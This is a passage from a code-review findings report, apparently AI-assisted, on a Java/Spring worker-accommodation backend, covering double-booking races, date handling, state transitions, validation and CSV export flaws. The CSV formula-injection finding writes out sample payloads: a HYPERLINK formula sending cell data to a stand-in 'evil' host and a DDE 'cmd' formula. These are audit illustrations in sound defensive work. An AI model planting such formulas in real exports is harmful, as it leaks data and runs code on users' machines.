- **Verified by the orchestrator (2026-09-14):** a throw-away integration test (not committed) posted `dateTo = null` against the real stack. Result: `POST /stays` with `dateTo = null` returns `500 INTERNAL_ERROR` on a **free** bed and on an occupied bed alike; the bounded control request returns 201. Server log: `org.postgresql.util.PSQLException: ERROR: date out of range: "169104628-12-09 BC +01"` raised from `countActiveStaysInBed` (wrapped as `DataIntegrityViolationException`). So the outcome is the "text path → 500" branch below, not the silent-bypass branch: open-ended stays are a documented feature (`CreateStayRequest.dateTo` is nullable, `chk_stays_dates` allows NULL) that has never worked through the API. The suggested fix stands unchanged.
- **Category:** constraint-engine
- **Location:** `src/main/java/com/beduno/stay/constraint/impl/BedOccupancyConstraint.java:38`
  `src/main/java/com/beduno/stay/constraint/impl/DoubleBookingConstraint.java:30`
  `src/main/java/com/beduno/stay/StayRepository.java:94-126,159-191`
- **What:** Both constraints substitute `LocalDate.MAX` for a null `dateTo` and pass it as a JPQL `LocalDate` parameter. On this stack (Hibernate 6.6.11, pgjdbc 42.7.5, default settings) that value is not bound as PostgreSQL `infinity`.
- **Evidence:** `var effectiveDateTo = ctx.dateTo() != null ? ctx.dateTo() : LocalDate.MAX;` then `s.dateFrom < :effectiveDateTo`. Verified statically from the jars in the Gradle cache: `LocalDateJavaType.getRecommendedJdbcType` picks `DateJdbcType` (JDBC type 91) unless `hibernate.type.prefer_java_type_jdbc_types` is set (it is not in `application*.yml`); `DateJdbcType$1.doBind` calls `LocalDateJavaType.unwrap` → `java.sql.Date.valueOf(LocalDate)` → `PreparedStatement.setDate(int, java.sql.Date[, Calendar])`. `java.sql.Date.valueOf(LocalDate.MAX)` overflows the epoch-millis `long` (year 999,999,999 ≈ 3.2e19 ms). pgjdbc's `LocalDate.MAX → "infinity"` mapping exists only in `TimestampUtils.toString(LocalDate)` (the `setObject(LocalDate)` path), not on the `setDate` path, which compares `getTime()` against exact `Long.MAX/MIN` sentinels and then clamps/formats the wrapped value.
- **Failure scenario:** `POST /stays {dateTo: null}` on a bed that already has a stay `[today, +30d)`. The wrapped millis are hugely negative; on pgjdbc's default binary DATE path they clamp to `-infinity`, `s.dateFrom < -infinity` is false for every row, count = 0, and the open-ended stay is created on the occupied bed (same for the worker's double-booking check). On the text path PostgreSQL instead rejects the year as out of range → 500. Either outcome is wrong; no test creates a stay with `dateTo = null` anywhere in `src/test` (grep found none), so this has never been exercised.
- **Suggested fix:** Drop the sentinel: make the JPQL null-aware (`AND (:dateTo IS NULL OR s.dateFrom < :dateTo)`) in the four `count…` queries, or use a representable far-future date (`LocalDate.of(9999, 12, 31)`) in a shared `StayDates.effectiveEnd(...)` helper. Add `BedAssignmentIntegrationTest.shouldRejectOpenEndedStay_whenBedOccupied` and `StayIntegrationTest.shouldRejectOpenEndedStay_whenWorkerAlreadyBooked`.
- **Confidence:** HIGH — the reviewer verified the binding path from bytecode (MEDIUM at the time); the orchestrator then executed the scenario and observed the 500 (see the verification note above).

#### DOM-02 — Bed assignment and worker double-booking are only application-level checks; concurrent requests can double-book
- **Severity:** HIGH
- **Category:** concurrency
- **Location:** `src/main/java/com/beduno/stay/StayService.java:414-446` (`resolveBed`)
  `src/main/java/com/beduno/stay/StayService.java:96-118,299-339` (`create`, `bulkAssign`)
  `src/main/resources/db/migration/V5__create_stays.sql`, `V11__add_stay_bed.sql` (no exclusion constraint; for the migrations reviewer)
- **What:** Every conflict check is a `COUNT(*)` under READ COMMITTED followed by an INSERT; there is no exclusion constraint on `(bed_id, daterange)` for active statuses, no unique/partial index, and no pessimistic lock on the bed, room or worker row. `@Version` on `Stay` only protects updates to an existing row.
- **Evidence:** `long occupied = … countActiveStaysInBed(...)` → `if (occupied > 0) hard.add(...)`; then in `create`: `stay = stayRepository.save(stay);` with nothing between the check and the insert.
- **Failure scenario:** Two planners submit `POST /stays` for the same room with `bedId = null` at the same moment (or two `bulk-assign` calls); both `resolveBed` loops see bed "1" free, both insert → two PLANNED stays on one bed; `GET /exceptions` will not flag it either (see DOM-09). Same race for one worker in two rooms. Separately, two simultaneous `check-in` calls on one stay collide on `@Version` and the loser gets `ObjectOptimisticLockingFailureException`, which `GlobalExceptionHandler` maps to 500, not 409.
- **Suggested fix:** Add a DB-level guard (migration): `CREATE EXTENSION btree_gist; ALTER TABLE stays ADD CONSTRAINT excl_stays_bed_period EXCLUDE USING gist (bed_id WITH =, daterange(date_from, COALESCE(date_to, 'infinity'::date), '[)') WITH &&) WHERE (status IN ('PLANNED','EXPECTED_TODAY','CHECKED_IN'))`, and the analogous one on `worker_id`; map the resulting `DataIntegrityViolationException` to 409/422. Cheaper interim: `@Lock(PESSIMISTIC_WRITE)` on `BedRepository.findAllByAgencyIdAndRoomId`/`findByIdAndAgencyIdAndRoomId` and on the worker lookup used by write paths, so concurrent writers serialize on the bed/worker rows. Add a handler for `ObjectOptimisticLockingFailureException` → 409.
- **Confidence:** HIGH

#### DOM-03 — Check-in without `bedId` silently re-auto-assigns the bed, discarding the planner's explicit choice
- **Severity:** HIGH
- **Category:** correctness
- **Location:** `src/main/java/com/beduno/stay/StayService.java:165-180`
  `src/main/java/com/beduno/stay/StayService.java:129-142` (same pattern on `update`)
- **What:** `checkIn` defaults the room to the stay's room when `request.roomId()` is null, but passes `request.bedId()` (null) straight into `resolveBed`, which runs the auto-assign loop from scratch and returns the lowest-labelled free bed — not the bed already stored on the stay.
- **Evidence:**
  ```java
  var targetRoomId = request.roomId() != null ? request.roomId() : stay.getRoomId();
  ...
  var assignment = resolveBed(room, worker, property,
          stay.getDateFrom(), stay.getDateTo(), request.bedId(), stay.getId());
  ...
  stay.setBedId(assignment.bed().getId());
  stay.setBedAutoAssigned(assignment.autoAssigned());
  ```
- **Failure scenario:** Planner creates a stay with explicit `bedId` = bed "3" (`bedAutoAssigned=false`) because beds "1"/"2" are reserved for later arrivals not yet planned. Front desk checks the worker in with `{}` (the documented minimal body): `resolveBed` excludes the stay itself, finds bed "1" free, and the stay is rewritten to bed "1" with `bedAutoAssigned=true`. The printed arrivals CSV (`Bed` column) now disagrees with the system. `OperationalWorkflowIntegrationTest.shouldCheckIn_whenStayIsExpectedToday` never asserts `bedId` is unchanged, so this is untested.
- **Suggested fix:** In `checkIn`, when `request.bedId() == null` and `request.roomId()` is null or equals `stay.getRoomId()`, keep `stay.getBedId()`: load it via `bedRepository.findByIdAndAgencyIdAndRoomId(stay.getBedId(), agencyId, room.getId())` and build `new BedAssignment(bed, stay.isBedAutoAssigned())`; only auto-assign when the room actually changes. Consider the same "keep unless changed" rule in `update` (a notes-only PUT currently reshuffles the bed). Add `shouldKeepPlannedBed_whenCheckInHasNoBedOverride`.
- **Confidence:** HIGH

#### DOM-04 — `PLANNED → EXPECTED_TODAY` happens only in a once-a-day sweep keyed on `dateFrom = today`; same-day plans, past-dated plans and any missed run leave stays un-check-in-able
- **Severity:** HIGH
- **Category:** state-machine
- **Location:** `src/main/java/com/beduno/stay/StayRepository.java:128-129`
  `src/main/java/com/beduno/stay/StayService.java:278-284`
  `src/main/java/com/beduno/stay/StayScheduler.java:17-22`
  `src/main/java/com/beduno/stay/StayStatus.java:20-21`
- **What:** The only path out of `PLANNED` (other than cancel) is the 06:00 cron promoting stays whose `date_from` equals today. `create` accepts any `dateFrom` (today or the past), the sweep never catches up on earlier dates, and `StayStatus` forbids `PLANNED → CHECKED_IN`. The deployment is a single instance that `docs/architecture.md` says is "stopped when the API is not in use", so missed 06:00 runs are expected, not hypothetical. "Today" is `LocalDate.now()` in the JVM default zone — nothing sets a zone (no `TZ`/`user.timezone` in `docker/Dockerfile` or `deploy/`), so in the container that is UTC and the cron fires at 07:00/08:00 Polish time.
- **Evidence:** `@Query("SELECT s FROM Stay s WHERE s.status = … PLANNED AND s.dateFrom = :date")` and `VALID_TRANSITIONS.put(PLANNED, EnumSet.of(EXPECTED_TODAY, CANCELLED));`
- **Failure scenario:** At 10:00 a planner creates a stay for a worker arriving tonight (`dateFrom = today`). It never appears in `GET /stays/arrivals`, and `POST /stays/{id}/check-in` returns 409 `error.stay.invalid_status_transition` forever; the only workaround is a DB update (which is exactly what every integration test does via `forceExpectedToday`). Likewise any stay whose `dateFrom` passed while the instance was stopped.
- **Suggested fix:** (1) Change the sweep to a catch-up: `WHERE s.status = PLANNED AND s.dateFrom <= :date` (keep it cross-tenant, already sanctioned). (2) Run `transitionPlannedToExpectedToday(today)` once at startup (`ApplicationReadyEvent`) in addition to the cron. (3) Either allow `PLANNED → CHECKED_IN` when `dateFrom <= today`, or promote synchronously in `create`/`update` when `dateFrom <= today`. (4) Pin the zone: `@Scheduled(cron = "...", zone = "${beduno.time-zone:Europe/Warsaw}")` and inject a `Clock` bean used by every `LocalDate.now()` in `StayService`, `StayController`, `RoomService`, `OccupancyController`. Add a `StaySchedulerTest`/service test — `transitionPlannedToExpectedToday` is currently never called by any test.
- **Confidence:** HIGH

#### DOM-05 — Stay dates are never validated; `dateTo <= dateFrom` reaches the `chk_stays_dates` CHECK and surfaces as 500
- **Severity:** HIGH
- **Category:** validation
- **Location:** `src/main/java/com/beduno/stay/dto/CreateStayRequest.java:9-18`, `UpdateStayRequest.java:9-16`, `BulkAssignRequest.java:15-23`, `CheckOutRequest.java:5`
  `src/main/java/com/beduno/stay/StayService.java:103-114,133-143,268-270,313-328`
  `src/main/java/com/beduno/common/exception/GlobalExceptionHandler.java:123-128` (no `DataIntegrityViolationException` handler)
- **What:** No request record or service method checks `dateTo > dateFrom`; the constraint engine does not either. `checkOut` overwrites `dateTo` with `actualDateTo` unconditionally. The database CHECK is the only guard and its failure is unhandled.
- **Evidence:** `if (request.actualDateTo() != null) { stay.setDateTo(request.actualDateTo()); }` and `CONSTRAINT chk_stays_dates CHECK (date_to IS NULL OR date_to > date_from)` in V5.
- **Failure scenario:** `POST /stays` with `dateFrom = 2026-09-20, dateTo = 2026-09-20` (a one-night misunderstanding) → engine passes → INSERT fails → `INTERNAL_ERROR`. `POST /check-out {actualDateTo: <dateFrom>}` (worker left the day he arrived) → 500 and no check-out. In `bulk-assign` the failing INSERT is deferred to the next item's auto-flush, so the whole batch dies (see DOM-07).
- **Suggested fix:** Add a class-level `@AssertTrue` (e.g. `isDateRangeValid() { return dateTo == null || dateTo.isAfter(dateFrom); }`) on `CreateStayRequest`, `UpdateStayRequest` and `BulkAssignRequest.Assignment`; in `checkOut` reject `actualDateTo <= stay.getDateFrom()` with `ValidationException("error.stay.invalid_dates")`; and add a `DataIntegrityViolationException → 409/400` handler as a safety net. Tests: `shouldReturnBadRequest_whenDateToNotAfterDateFrom` for create/update/bulk/check-out.
- **Confidence:** HIGH

#### DOM-06 — Room/property consistency is not enforced on any write path; a mismatched stay disappears from every occupancy view
- **Severity:** HIGH
- **Category:** data-integrity
- **Location:** `src/main/java/com/beduno/stay/StayService.java:100-101` (create), `:130-131` (update), `:165-168,176-178` (check-in override), `:214-216,247-248` (move), `:310-312` (bulk)
- **What:** `roomId` is resolved with `roomRepository.findByIdAndAgencyId` only; the stay's `propertyId` is taken from the request (create/bulk) or left unchanged (update/check-in/move) without checking `room.getPropertyId().equals(propertyId)`.
- **Evidence:** `var room = getRoomOrThrow(request.roomId(), agencyId); var property = getPropertyOrThrow(request.propertyId(), agencyId);` — no cross-check; in `move`: `newStay.setPropertyId(stay.getPropertyId()); newStay.setRoomId(request.targetRoomId());`
- **Failure scenario:** Check-in with `roomId` from property B on a stay of property A (or a client bug sending the wrong `propertyId`). Occupancy/inspection/exceptions for A fetch the stay (`propertyId = A`) but drop it because `staysByRoom` has no matching room in A; views for B never fetch it. The worker is checked in but visible nowhere, and the bed in B is counted free by nobody except the constraint engine. The API spec already documents this as a caveat; the code still allows it.
- **Suggested fix:** In `StayService`, replace `getRoomOrThrow(roomId, agencyId)` on write paths with `roomRepository.findByIdAndAgencyIdAndPropertyId(roomId, agencyId, propertyId).orElseThrow(() -> new NotFoundException("error.room.not_found"))` (the method already exists on `RoomRepository`); in `checkIn`/`move` use `stay.getPropertyId()` as the property. Add `shouldRejectCreate_whenRoomBelongsToOtherProperty` and the check-in/move variants.
- **Confidence:** HIGH

#### DOM-07 — Bulk assign/checkout are neither atomic nor per-item: any persistence-level failure poisons the transaction, blames the wrong item and ends in a 500 that discards all "created" rows
- **Severity:** MEDIUM
- **Category:** transaction
- **Location:** `src/main/java/com/beduno/stay/StayService.java:299-339` (`bulkAssign`), `:341-371` (`bulkCheckout`), `:333-336`, `:365-368` (catch blocks)
- **What:** Entities use `GenerationType.UUID`, so `save()` does not hit the database; the INSERT runs on the next repository call's auto-flush or at commit. A DB failure therefore (a) is raised inside a *different* item's `try`, (b) is thrown through the repository proxy's participating transaction, which marks the outer transaction rollback-only, so the method's return value is thrown away as `UnexpectedRollbackException` (500), and (c) `e.getMessage()` of non-business exceptions (SQL text, or `null` for NPEs) is written into `errorCode`. Nothing is logged in either catch.
- **Evidence:**
  ```java
  } catch (Exception e) {
      results.add(new AssignmentResult(i, a.workerId(), null, null, "error", e.getMessage()));
      errors++;
  }
  ```
- **Failure scenario:** 20 assignments, item 7 has `dateTo == dateFrom` (DOM-05). Items 0–6 are reported "created"; item 8's `getWorkerOrThrow` query flushes item 7's INSERT, which fails; item 8 is recorded as `"error"` with a raw PostgreSQL message; the transaction is rollback-only; the client receives 500 and nothing was persisted. `BulkOperationsIntegrationTest` only covers business-level failures (constraint/404), never a persistence-level one.
- **Suggested fix:** Decide and document the contract. For true per-item semantics move the per-item body into a separate bean method annotated `@Transactional(propagation = REQUIRES_NEW)` (self-invocation will not work), and `flush()` inside it. Regardless, in the catch use `e instanceof BusinessException be ? be.getMessageCode() : "error.internal"`, `log.warn` the exception, and validate inputs (DOM-05) so DB failures cannot originate from user input.
- **Confidence:** HIGH

#### DOM-08 — A CHECKED_IN stay whose `dateTo` has passed vanishes from occupancy and frees its bed while the worker is still checked in
- **Severity:** MEDIUM
- **Category:** correctness
- **Location:** `src/main/java/com/beduno/stay/StayRepository.java:131-144` (`findActiveStaysForPropertyOnDate`, line 137)
  `src/main/java/com/beduno/stay/StayRepository.java:94-126` (bed counts), `src/main/java/com/beduno/room/RoomService.java:161-163`
- **What:** All "who is here" queries and the bed-occupancy check require `s.dateTo IS NULL OR s.dateTo > :date`. Status `CHECKED_IN` does not override the planned end date, and nothing auto-checks-out or flags overstays.
- **Evidence:** `AND s.dateFrom <= :date AND (s.dateTo IS NULL OR s.dateTo > :date)` with `statuses = [CHECKED_IN]`.
- **Failure scenario:** Worker A is CHECKED_IN in bed 1, planned `dateTo` = yesterday, never checked out (common: extended contract). Today `GET /occupancy` shows bed 1 empty, `GET /inspection` omits A (the inspector reports him as `UNEXPECTED_PRESENT`), `POST /stays` for worker B on bed 1 from today passes `BedOccupancyConstraint`, and B can be checked in → two CHECKED_IN workers in one bed with no exception raised.
- **Suggested fix:** Treat `CHECKED_IN` as occupying through `GREATEST(date_to, :date + 1)`: in the occupancy/inspection query use `AND (s.dateTo IS NULL OR s.dateTo > :date OR s.status = CHECKED_IN)`, and in `countActiveStaysInBed*` add `OR s.status = CHECKED_IN` to the end-date clause. Add an `OVERSTAY` exception type in `OccupancyService.getExceptions` for CHECKED_IN stays with `dateTo <= date`. Test: `shouldStillShowCheckedInWorker_whenPlannedDateToHasPassed`.
- **Confidence:** HIGH

#### DOM-09 — The `OVER_CAPACITY` safety net is room-level and cannot detect the bed-level violations the system now cares about
- **Severity:** MEDIUM
- **Category:** data-integrity
- **Location:** `src/main/java/com/beduno/occupancy/OccupancyService.java:100-108`
- **What:** The exception compares the number of CHECKED_IN stays to the number of ACTIVE beds. Two occupants on the same bed, or an occupant on a BLOCKED bed, keep `checkedIn.size() <= counts.active()` and are not reported — precisely the shape of the V12 backfill defect documented in `context/changes/testing-data-integrity-guardrails/plan.md`, and of DOM-01/DOM-02/DOM-08.
- **Evidence:** `if (checkedIn.size() > counts.active()) { exceptions.add(new OccupancyExceptionResponse(..., "OVER_CAPACITY", ...)); }`
- **Failure scenario:** Room with beds 1, 2 (ACTIVE). Stays A and B both CHECKED_IN on bed 1 (backfilled data, or a race). `GET /exceptions` returns nothing; the occupancy board shows both in the room with the same `bedLabel` and the reader has to notice.
- **Suggested fix:** Group `checkedIn` by `bedId`; emit `OVER_CAPACITY` (or a new `BED_CONFLICT`) when any bed has more than one CHECKED_IN stay, and `BED_BLOCKED_OCCUPIED` when a CHECKED_IN stay's bed is BLOCKED or missing from the room. Add `shouldReturnException_whenTwoWorkersCheckedInOnSameBed` (seed via `jdbcTemplate` as the existing tests do).
- **Confidence:** HIGH

#### DOM-10 — Check-in writes the audit "previous" snapshot after mutating the stay, so a room/bed override never shows in the audit trail
- **Severity:** MEDIUM
- **Category:** correctness
- **Location:** `src/main/java/com/beduno/stay/StayService.java:176-186`
- **What:** `roomId`, `bedId` and `bedAutoAssigned` are set before `snapshot(stay)` is taken as `previous`; only the status change is captured as a difference.
- **Evidence:**
  ```java
  if (request.roomId() != null) { stay.setRoomId(request.roomId()); }
  stay.setBedId(assignment.bed().getId());
  stay.setBedAutoAssigned(assignment.autoAssigned());
  var previous = snapshot(stay);
  stay.setStatus(StayStatus.CHECKED_IN);
  ```
- **Failure scenario:** Front desk checks a worker into a different room than planned. The `CHECKED_IN` audit event has `previousState.roomId == newState.roomId`; the planned room is unrecoverable from the trail even though the API spec points auditors there (`confirmed_by_user_id … read it from the audit trail`).
- **Suggested fix:** Move `var previous = snapshot(stay);` above the first mutation (right after `runConstraints`). Add an assertion on `previousState.roomId` in `shouldCheckIn_withRoomOverride` via `GET /audit`.
- **Confidence:** HIGH

#### DOM-11 — Same-room move with auto-assign is refused whenever the worker already holds the lowest free bed
- **Severity:** MEDIUM
- **Category:** state-machine
- **Location:** `src/main/java/com/beduno/stay/StayService.java:228-232`, `:423-444`
- **What:** `resolveBed` is called with `excludeStayId = stay.getId()`, so the worker's current bed counts as free; sorted by label it is usually the first candidate, is returned, and the subsequent equality check throws `error.stay.move_same_room` even when other beds in the room are free.
- **Evidence:** `var assignment = resolveBed(targetRoom, ..., request.targetBedId(), stay.getId()); if (stay.getBedId().equals(assignment.bed().getId())) { throw new ConflictException("error.stay.move_same_room"); }`
- **Failure scenario:** Worker in bed "1" of a 4-bed room, beds 2–4 free. `POST /move {targetRoomId: <same room>, targetBedId: null}` → 409, although the documented contract is "a move to a different bed in the same room now succeeds". `shouldMoveToNewBed_whenSameRoomDifferentBed` only covers the explicit-bed case.
- **Suggested fix:** Pass an `excludeBedId` into `resolveBed` (or filter `candidates` with `!bed.getId().equals(stay.getBedId())` when `targetRoom.getId().equals(stay.getRoomId())`). Test: `shouldMoveToNextFreeBed_whenSameRoomAutoAssign`.
- **Confidence:** HIGH

#### DOM-12 — Worker CSV import: unvalidated column lengths turn into deferred DB failures that blame the next row and lose the whole import
- **Severity:** MEDIUM
- **Category:** validation
- **Location:** `src/main/java/com/beduno/worker/WorkerService.java:125-210` (row loop; catches at 201 and 206)
  `src/main/resources/db/migration/V3__create_workers.sql` (`internal_id`/`first_name`/`last_name` VARCHAR(100), `phone` VARCHAR(50), `gender` VARCHAR(10))
- **What:** The JSON path enforces `@Size` limits; the CSV path enforces none, and the same deferred-flush mechanics as DOM-07 apply (`save()` does not insert; the next row's `existsByAgencyIdAndInternalId` flushes it). The outer `catch (Exception e)` additionally relabels any unexpected exception as `error.worker.import.file_unreadable`.
- **Evidence:** `worker.setFirstName(firstName); … worker = workerRepository.save(worker);` with no length checks; row-level `catch (Exception e) { log.warn(...); errors.add(new WorkerImportError(row, null, "error.worker.import.row_failed")); }`.
- **Failure scenario:** Row 12 has a 120-character `firstName`. Row 13's duplicate check flushes row 12's INSERT → `value too long` → row 13 is reported as `row_failed`, the transaction is rollback-only, and the request ends in 500 with zero workers created and no `errorDetails` delivered.
- **Suggested fix:** Validate lengths per row before `save` (reject with a new `error.worker.import.field_too_long`), or run the parsed rows through the same Bean Validation as `CreateWorkerRequest` (`Validator.validate(new CreateWorkerRequest(...))`). Narrow the outer catch to `IOException`. Also note `log.warn("... {}", e.getMessage())` can echo row content (date of birth) into logs, contrary to the "never log PII" rule.
- **Confidence:** HIGH

#### DOM-13 — CSV exports are vulnerable to formula injection and mis-escape `\r`
- **Severity:** MEDIUM
- **Category:** correctness
- **Location:** `src/main/java/com/beduno/occupancy/ExportService.java:141-149`
- **What:** `escapeCsvField` quotes only on `,`, `"` and `\n`. Cells beginning with `=`, `+`, `-`, `@` (or containing `\r`) are emitted verbatim. Room numbers, floors and worker names are free text that agency users (and CSV import) control; the files are opened in Excel/LibreOffice by design.
- **Evidence:** `if (value.contains(",") || value.contains("\"") || value.contains("\n")) { return "\"" + value.replace("\"", "\"\"") + "\""; } return value;`
- **Failure scenario:** A worker imported with `lastName = =HYPERLINK("http://evil/"&A1,"open")` (or `=cmd|' /C calc'!A0`) appears in every occupancy/exception export and executes on open. A `\r` inside `notes`-like fields is not applicable here, but a room number containing `\r` splits the row.
- **Suggested fix:** In `escapeCsvField`, when the first character is one of `= + - @ \t \r`, prefix the value with `'` (or a tab) and always quote; add `\r` to the quoting condition. Consider writing a UTF-8 BOM so Excel renders the PL/UA/RU headers. Add an `ExportIntegrationTest` case with a room number `=1+1` and a name containing `,` and `"` — today only header rows are tested.
- **Confidence:** HIGH

#### DOM-14 — Soft-deleting a worker leaves PLANNED/EXPECTED_TODAY/CHECKED_IN stays active and orphans the bed
- **Severity:** MEDIUM
- **Category:** data-integrity
- **Location:** `src/main/java/com/beduno/worker/WorkerService.java:114-122`
  `src/main/java/com/beduno/stay/StayService.java:462-465` (`getWorkerOrThrow` excludes DELETED)
- **What:** `delete` flips status without touching stays. Those stays still count for `BedOccupancyConstraint` and `DoubleBookingConstraint`, still appear in occupancy (via the unfiltered `findAllById`), and every stay operation that loads the worker (`update`, `checkIn`, `move`) now fails with 404 `error.worker.not_found`, while `checkOut`/`cancel` (which do not load the worker) still work. Nothing surfaces this to the user.
- **Evidence:** `worker.setStatus(WorkerStatus.DELETED); worker.setDeletedAt(Instant.now()); workerRepository.save(worker);` — no stay lookup.
- **Failure scenario:** Admin deletes a worker who has an open-ended PLANNED stay next month. The bed stays reserved forever (no one can be placed on it; auto-assign skips it), the arrivals list will show a worker who cannot be checked in (404 on the worker inside check-in), and the planner cannot `PUT` the stay to fix it either.
- **Suggested fix:** In `WorkerService.delete`, either refuse with 409 `error.worker.has_active_stays` when `stayRepository.countActiveByWorker(...) > 0`, or cancel PLANNED/EXPECTED_TODAY stays and refuse only for CHECKED_IN. Test: `shouldRejectDelete_whenWorkerHasActiveStay`.
- **Confidence:** HIGH

#### DOM-15 — Inspection report: duplicate `roomId` entries throw `IllegalStateException` (500); duplicate worker ids duplicate discrepancies
- **Severity:** MEDIUM
- **Category:** validation
- **Location:** `src/main/java/com/beduno/occupancy/OccupancyService.java:162-163`, `:177-181`
  `src/main/java/com/beduno/occupancy/dto/InspectionReportRequest.java`, `RoomActualOccupancy.java`
- **What:** `Collectors.toMap` without a merge function; `presentWorkerIds` is a `List` iterated as-is; the property itself is never verified to exist (all four occupancy endpoints return `[]` for unknown/foreign ids, unlike `RoomService` which 404s).
- **Evidence:** `.collect(Collectors.toMap(RoomActualOccupancy::roomId, RoomActualOccupancy::presentWorkerIds));`
- **Failure scenario:** The mobile inspector app sends the same room twice (two partial scans) → `Duplicate key …` → `INTERNAL_ERROR`. Sending `[w1, w1]` for a room where `w1` is not expected yields two `UNEXPECTED_PRESENT` items.
- **Suggested fix:** Merge on collision (`(a, b) -> concat`), convert `presentWorkerIds` to a `Set`, and call `propertyService.getPropertyOrThrow(propertyId)` at the top of the four `OccupancyService` methods (and in `ExportService`). Test: `shouldMergeDuplicateRoomEntries_whenReportRepeatsARoom`.
- **Confidence:** HIGH

#### DOM-16 — Unbounded batch sizes and a numeric-label overflow
- **Severity:** MEDIUM
- **Category:** validation
- **Location:** `src/main/java/com/beduno/bed/dto/BulkGenerateBedsRequest.java:6`
  `src/main/java/com/beduno/bed/BedService.java:80-98,100-107`
  `src/main/java/com/beduno/stay/dto/BulkAssignRequest.java:12`, `BulkCheckoutRequest.java:9`
- **What:** `count` has `@Min(1)` but no maximum; `bulkGenerate` issues one `save` and one audit row per bed inside one transaction. `assignments`/`stayIds` have `@NotEmpty` but no `@Size(max=…)`. `highestNumericLabel` parses any `\d+` label with `Long.parseLong`, so a 20-digit label (allowed by `@Size(max=50)`) throws `NumberFormatException` → 500 on every later bulk-generate for that room.
- **Evidence:** `@Min(1) int count` and `.filter(label -> label.matches("\\d+")).mapToLong(Long::parseLong)`
- **Failure scenario:** `POST .../beds/bulk-generate {count: 5000000}` from any PROPERTY_ADMIN pins the instance (1 GB heap) in one transaction; a bed renamed to `99999999999999999999` makes the room's bulk-generate permanently 500.
- **Suggested fix:** `@Max(200)` on `count`, `@Size(max = 500)` on the two lists; in `highestNumericLabel` use `label.matches("\\d{1,9}")` or catch `NumberFormatException` and ignore.
- **Confidence:** HIGH

#### DOM-17 — `PUT /stays/{id}` on an EXPECTED_TODAY stay does not reconcile status with the new `dateFrom`
- **Severity:** MEDIUM
- **Category:** state-machine
- **Location:** `src/main/java/com/beduno/stay/StayService.java:125-146`
- **What:** Update is allowed for PLANNED and EXPECTED_TODAY, and `updateEntity` rewrites `dateFrom`, but the status is left untouched. `EXPECTED_TODAY` is only meaningful when `dateFrom == today`.
- **Evidence:** `if (stay.getStatus() != PLANNED && stay.getStatus() != EXPECTED_TODAY) throw …; … stayMapper.updateEntity(request, stay);` — no status change.
- **Failure scenario:** Arrival postponed by a week: planner PUTs `dateFrom = today + 7`. The stay stays `EXPECTED_TODAY`, so `check-in` is permitted today (status allows it) and `getArrivals` on the new date lists it only because status happens to match, while for the intervening week `GET /stays?status=EXPECTED_TODAY` reports a phantom arrival.
- **Suggested fix:** After mapping, `if (stay.getStatus() == EXPECTED_TODAY && !request.dateFrom().equals(today)) stay.setStatus(PLANNED);` (and, with DOM-04 fixed, promote PLANNED to EXPECTED_TODAY when `dateFrom <= today`). Test: `shouldRevertToPlanned_whenExpectedTodayStayIsPostponed`.
- **Confidence:** HIGH

#### DOM-18 — New unsanctioned cross-tenant read in `ExportService`, and the sanctioned `loadWorkers` exception is now unnecessary
- **Severity:** LOW
- **Category:** code-quality
- **Location:** `src/main/java/com/beduno/occupancy/ExportService.java:85-92` (line 90)
  `src/main/java/com/beduno/occupancy/OccupancyService.java:189-196` (line 194)
  `src/main/java/com/beduno/worker/WorkerRepository.java:83`
- **What:** `bedRepository.findAllById(distinctIds)` has no `agencyId` predicate and is not one of the three exceptions recorded in `CLAUDE.md`/`AGENTS.md`. It is safe today for the same reason as `loadWorkers` (ids come from an agency-filtered stay query), but `WorkerRepository.findAllByAgencyIdAndIdIn` already exists (used by `RoomService`), so the documented exception could be retired rather than duplicated.
- **Evidence:** `return bedRepository.findAllById(distinctIds).stream().collect(Collectors.toMap(Bed::getId, Bed::getLabel));`
- **Failure scenario:** None today; a future caller passing ids from a non-filtered source silently reads other agencies' bed labels/worker names.
- **Suggested fix:** Add `List<Bed> findAllByAgencyIdAndIdIn(UUID agencyId, Collection<UUID> ids)` to `BedRepository` and use it in `ExportService`; switch `OccupancyService.loadWorkers` to `findAllByAgencyIdAndIdIn(agencyId, workerIds)` and delete the exception from `CLAUDE.md`/`AGENTS.md`/`docs/architecture.md`.
- **Confidence:** HIGH

#### DOM-19 — Dead code, stale "phase 4" comments, duplicated helpers, MapStruct unmapped-target policy left at WARN
- **Severity:** LOW
- **Category:** code-quality
- **Location:** `src/main/java/com/beduno/stay/StayRepository.java:60-92` (`countActiveStaysInRoom`, `…Excluding` — no callers)
  `src/main/java/com/beduno/stay/StayMapper.java:42`, `src/main/java/com/beduno/worker/WorkerMapper.java:38`, `stay/dto/StaySummary.java`, `worker/dto/WorkerSummary.java` (unused)
  `src/main/java/com/beduno/stay/StayService.java:397-399` (`toStringMap` identity)
  `src/main/java/com/beduno/stay/constraint/ConstraintContext.java:11-15`, `impl/BedOccupancyConstraint.java:16-20`, `impl/BlockedRoomConstraint.java:36-37` (comments say "bed is null on every write path until phase 4"; phase 4 shipped in commit edcbb8d)
  `currentUserId()` copied verbatim in `StayService`, `BedService`, `RoomService`, `PropertyService`, `WorkerService`
  `build.gradle.kts:45-52` (no `-Amapstruct.unmappedTargetPolicy=ERROR`)
- **What:** Leftovers from the V13 capacity retirement and the named-beds rollout; the stale comments actively mislead (the null-bed no-op is now a latent hole, not a transition state). With MapStruct at the default WARN, a new `Stay` field would be silently dropped from `StayResponse`.
- **Evidence:** `private Map<String, Object> toStringMap(Map<String, Object> params) { return params; }`
- **Failure scenario:** Maintenance risk only.
- **Suggested fix:** Delete the two room-count queries, the `toSummary` methods and records, and `toStringMap`; rewrite the three comments to state the invariant ("bed is non-null on every path; null is tolerated only for unit tests"); extract `currentUserId()` into `CurrentUser.current()` or a small `SecurityUtils`; add `options.compilerArgs.add("-Amapstruct.unmappedTargetPolicy=ERROR")`.
- **Confidence:** HIGH

#### DOM-20 — Small validation gaps: `internalId` length, empty-string override, `PUT status=DELETED`
- **Severity:** LOW
- **Category:** validation
- **Location:** `src/main/java/com/beduno/worker/dto/CreateWorkerRequest.java:12`
  `src/main/java/com/beduno/stay/StayService.java:383`
  `src/main/java/com/beduno/worker/dto/UpdateWorkerRequest.java:20-21`, `WorkerService.java:100-110`
- **What:** `internalId` is `@NotBlank` only while the column is `VARCHAR(100)` (101 chars → 500). `runConstraints` treats `overrideReason == null` as "no override", so `""` suppresses soft violations and is persisted/audited as the reason. `UpdateWorkerRequest.status` accepts `DELETED`, producing a deleted worker without `deletedAt` (documented caveat, still a data-shape inconsistency).
- **Evidence:** `if (result.hasWarnings() && overrideReason == null) { throw … }`
